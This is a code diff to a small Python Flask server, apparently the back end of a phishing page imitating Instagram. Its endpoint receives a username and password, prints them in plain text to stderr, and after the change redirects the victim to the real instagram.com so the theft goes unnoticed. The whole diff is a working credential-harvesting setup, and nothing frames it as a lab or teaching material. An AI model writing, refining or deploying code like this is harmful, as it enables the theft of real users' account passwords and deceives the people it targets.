@@ -1,6 +1,6 @@
 import flask
 import sys
-from flask import request, jsonify
+from flask import request, jsonify, redirect
 
 # Create a flask instance
 app = flask.Flask(__name__)
@@ -12,8 +12,6 @@ def post_result():
     password = request.json['password']
     print("\n\nUsername: " + username + "\n", file = sys.stderr)
     print("Password: " + password + "\n\n", file = sys.stderr)
-    return "success"
-
-
+    return redirect('https://www.instagram.com')
 
 app.run()
